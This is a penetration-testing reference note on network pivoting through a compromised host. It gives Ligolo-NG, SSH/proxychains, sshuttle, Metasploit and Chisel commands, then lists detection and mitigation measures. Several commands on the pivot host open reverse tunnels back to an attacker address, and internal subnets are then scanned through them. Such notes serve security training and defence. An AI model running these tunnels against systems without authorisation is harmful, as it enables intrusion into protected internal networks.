---
tags:
  - "#type/technique"
  - "#tactic/TA0008"
  - "#technique/T1572"
  - "#stage/lateral-movement"
  - "#tool/ligolo-ng"
  - "#tool/proxychains"
  - "#tool/sshuttle"
  - "#os/linux"
  - "#os/windows"
  - "#networking"
aliases:
  - Network Pivoting
  - Tunneling
  - Network Lateral Movement
  - Traffic Redirection
---

## Technique
___

Pivoting is a technique used to access otherwise unreachable networks by routing traffic through a compromised host. This method allows attackers to move laterally through segmented networks, access resources on internal subnets, and evade network security controls like firewalls.

The pivoting host (sometimes called a "jump box") acts as a bridge between the attacker and target networks, allowing traffic to flow between networks that wouldn't normally be able to communicate directly.

## Prerequisites
___

**Access Level:** 
- Command execution on the pivot host
- Ability to transfer and run tools on the pivot host
- Network connectivity between the attacker, pivot host, and target network

**System State:**
- Pivot host must have access to both the attacker's network and the target network
- Appropriate tools must be available or transferable to the pivot host

## Pivoting with Ligolo-NG
___

[Ligolo-NG](https://github.com/Nicocha30/ligolo-ng) is a powerful, cross-platform tunneling tool designed for secure pivoting during penetration tests.

### Single Pivot Setup

**On Attack Host:**

1. Set up TUN interface:
```bash
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
```

2. Start the proxy server:
```bash
./proxy -selfcert -laddr 0.0.0.0:443
```

3. Add route to the target subnet:
```bash
sudo ip route add 172.16.139.0/24 dev ligolo
```

**On Target (Pivot) Host:**

1. Run the agent to connect back to the attack host:
```bash
agent.exe -connect <attackIP>:443 -ignore-cert
```

**Back on Attack Host:**

1. Select the session:
```bash
session
```

2. Add port forwards to access services:
```bash
listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80
listener_add --addr 0.0.0.0:8081 --to 127.0.0.1:81
listener_add --addr 0.0.0.0:8082 --to 127.0.0.1:82
```

3. Start the tunnel:
```bash
start
```

### Double Pivot Setup

For accessing networks beyond the first pivot host:

**On Attack Host:**

1. Set up TUN interfaces for both pivots:
```bash
sudo ip tuntap add user kali mode tun ligolo ; sudo ip link set ligolo up
sudo ip tuntap add user kali mode tun double ; sudo ip link set double up
```

2. Start the proxy server:
```bash
./proxy -selfcert -laddr 0.0.0.0:443
```

3. Add routes to both target subnets:
```bash
sudo ip route add 172.16.139.0/24 dev ligolo
sudo ip route add 172.16.210.0/24 dev double
```

**First Pivot Host:**

1. Connect back to attack host:
```bash
agent.exe -connect <attackIP>:443 -ignore-cert
```

**On Attack Host:**

1. Select the session:
```bash
session
```

2. Add listener for second pivot:
```bash
listener_add --addr 0.0.0.0:139 --to 127.0.0.1:443
```

3. Add standard port forwards:
```bash
listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80
listener_add --addr 0.0.0.0:8081 --to 127.0.0.1:81
```

4. Start first tunnel:
```bash
start
```

**Second Pivot Host:**

1. Connect to first pivot host:
```bash
agent.exe -connect <firstPivotIP>:139 -ignore-cert
```

**Back on Attack Host:**

1. Switch to second pivot session
2. Add port forwards for second pivot:
```bash
listener_add --addr 0.0.0.0:5050 --to 127.0.0.1:50
listener_add --addr 0.0.0.0:5051 --to 127.0.0.1:51
```

3. Start second tunnel with specific TUN device:
```bash
start --tun double
```

**Verify access to both networks:**
```bash
nxc smb 172.16.139.0/24
nxc smb 172.16.210.0/24
```

## SSH-Based Pivoting
___

### Proxychains with SSH Dynamic Port Forwarding

1. Create a SOCKS proxy using SSH:
```bash
ssh -D 9050 user@<jumpIP>
```

2. Verify proxychains configuration in `/etc/proxychains.conf` or `/etc/proxychains4.conf`:
```
socks4  127.0.0.1 9050
```

3. Use proxychains to route tools through the tunnel:
```bash
proxychains nmap -v -Pn -sT <internalIP>
proxychains firefox
proxychains impacket-smbclient internal.domain.local/user:pass@internalserver
```

> **Note:** Proxychains can only perform full TCP connect scans (`-sT`) as it doesn't handle partial packets correctly.

### SSHuttle (Transparent Proxy)

[SSHuttle](https://github.com/sshuttle/sshuttle) is a transparent proxy that routes traffic through an SSH connection without requiring proxychains:

```bash
sudo sshuttle -r user@<jumpHost> 172.16.5.0/23 -v
```

This creates iptables rules to transparently redirect all traffic to the specified subnet through the SSH tunnel, allowing direct use of tools:

```bash
nmap -v -sV 172.16.5.19 -A -Pn
firefox http://172.16.5.19
```

## Other Pivoting Techniques
___

### Metasploit's Routing and Port Forwarding

After getting a Meterpreter session:

```
# Add route through compromised host
meterpreter > run autoroute -s 192.168.1.0/24

# Or from msfconsole
msf > route add 192.168.1.0/24 <session_id>

# Create a SOCKS proxy
msf > use auxiliary/server/socks_proxy
msf > set SRVPORT 9050
msf > set VERSION 4a
msf > run
```

### Chisel (Cross-Platform TCP/UDP Tunnel)

1. On attack host:
```bash
./chisel server -p 8080 --reverse
```

2. On pivot host:
```bash
./chisel client <attackIP>:8080 R:socks
```

## Detection & Mitigation
___

### Detection

- Monitor for unusual outbound connections, especially over non-standard ports
- Look for unexpected listening ports on internal systems
- Detect SSH connections with dynamic port forwarding (-D option)
- Watch for network traffic patterns inconsistent with normal business functions
- Monitor for the presence of tunneling tools (Ligolo, Chisel, etc.)

### Mitigation

- Implement proper network segmentation with restrictive ACLs
- Use application-layer inspection to identify tunneled traffic
- Deploy an internal proxy for outbound web traffic
- Monitor and restrict outbound connections to the internet
- Implement jump servers with detailed logging for administrative access
- Use host-based firewalls to restrict unnecessary connections
- Deploy network traffic analysis tools to identify anomalous traffic patterns